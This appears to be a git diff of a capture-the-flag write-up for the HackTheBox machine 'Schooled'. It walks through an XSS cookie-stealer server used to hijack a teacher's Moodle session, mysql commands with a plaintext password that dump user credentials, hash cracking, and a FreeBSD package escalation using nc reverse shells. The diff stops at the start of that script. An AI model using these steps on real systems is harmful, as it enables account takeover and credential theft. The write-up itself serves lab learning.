@@ -21,7 +21,7 @@ Get ready to be schooled trying this one!
 
 ## ENUMERATION
 
-- Beginning enumeration using nmap using a default script and version scan with the verbosity on to see open ports on the fly without having to wait for the scan to finish. Ports 22,80 are found open.
+- Beginning enumeration with nmap using a default script and version scan with the verbosity on to see open ports on the fly without having to wait for the scan to finish. Ports 22,80 are found open.
     ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled1.png)
 - Scanning for all ports using nmap shows **mysql** is running on port **33060**.
     ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled2.png)
@@ -57,7 +57,7 @@ Get ready to be schooled trying this one!
 
 ----------------------------------------------------------------------------------------------------
 
-### FOOTHOLD:
+## FOOTHOLD:
 
 - Setup a `xss-server` with this [simple python script](https://github.com/lnxg33k/misc/blob/master/XSS-cookie-stealer.py). 
 - Start the server. 
@@ -67,9 +67,7 @@ Get ready to be schooled trying this one!
     ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled6.png)
 - Wait for a few seconds and recieve the teachers cookie on your `xss-server`.
     ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled7.png)
-- Copy this `cookie --> Inspect Element --> Storage --> replace MoodleSession's value to the cookie --> refresh` the pg/F5 to. You're Now Manuel Phillips (Teacher).
-
-----------------------------------------------------------------------------------------------------
+- Copy this `cookie --> Inspect Element --> Storage --> replace MoodleSession's value to the cookie`. Refresh the pg/F5 to. You're Now Manuel Phillips (Teacher).
 
 ### PRIVILEGE ESCALATION: TEACHER --> MANAGER --> ADMIN
 
@@ -100,7 +98,7 @@ Get ready to be schooled trying this one!
 ----------------------------------------------------------------------------------------------------
 
 
-### POST EXPLOITATION
+## POST EXPLOITATION
 
 **user.txt:**
 
@@ -113,26 +111,28 @@ Get ready to be schooled trying this one!
 - We perform 3 basic queries now to enumerate the database: 
     - First cd to /usr/local/bin.
 - Then:
-    - `mysql -u moodle -pPlaybookMaster2020 -e 'show databases;'` --> infer moodle as the db name.
-    - `mysql -u moodle -pPlaybookMaster2020 -e 'use moodle; show tables;'`  --> infer mdl_user could be of interest.
-    - `mysql -u moodle -pPlaybookMaster2020 -e 'use moodle; select * from mdl_user;'` --> DB creds dump. 
+    > `mysql -u moodle -pPlaybookMaster2020 -e 'show databases;'` --> infer moodle as the db name.
+    
+    > `mysql -u moodle -pPlaybookMaster2020 -e 'use moodle; show tables;'`  --> infer mdl_user could be of interest.
+    
+    > `mysql -u moodle -pPlaybookMaster2020 -e 'use moodle; select * from mdl_user;'` --> DB creds dump. 
     ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled12.png)
 - Jamie's account here is of interest as he is one of the users on the box.
 - This hash is a `bcrypt hash`.
-- Using john the ripper to crack the hash:
-    ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled13..jpg)
+- Usejohn the ripper to crack the hash:
+    ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled13.jpg)
 - Jamies creds: *jamie:!#####x*
 - Now ssh over with these creds.
-- Grab user.txt from jamie's home directory.
+- Grab `user.txt` from jamie's home directory.
 
 **root.txt**
 
 - Performing a basic `sudo -l`:
     ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled14.png)
-= Poking around the internet and doing some good research on what the command is we find that it is a distinct binary that is replaced by the bootstrapped binary during the initial installation process.
+- Poking around the internet and doing some good research on what the command is we find that it is a distinct binary that is replaced by the bootstrapped binary during the initial installation process.
 - We can use this to probably install a custom package with code modified to privilege escalate to root.
 - [Refer this article](http://lastsummer.de/creating-custom-packages-on-freebsd/)
-- After reading the article put it all as a single script and modify parts of it as per your host listener. I used `nc` shells as the box has netcat and bsd just wouldn't work well with regular bash shells.
+- After reading the article put it all as a single script and modify parts of it as per your host listener. Use`nc` shells as the box has netcat and bsd just wouldn't work well with regular bash shells.
 - The script :
     ```bash
     #!/bin/sh
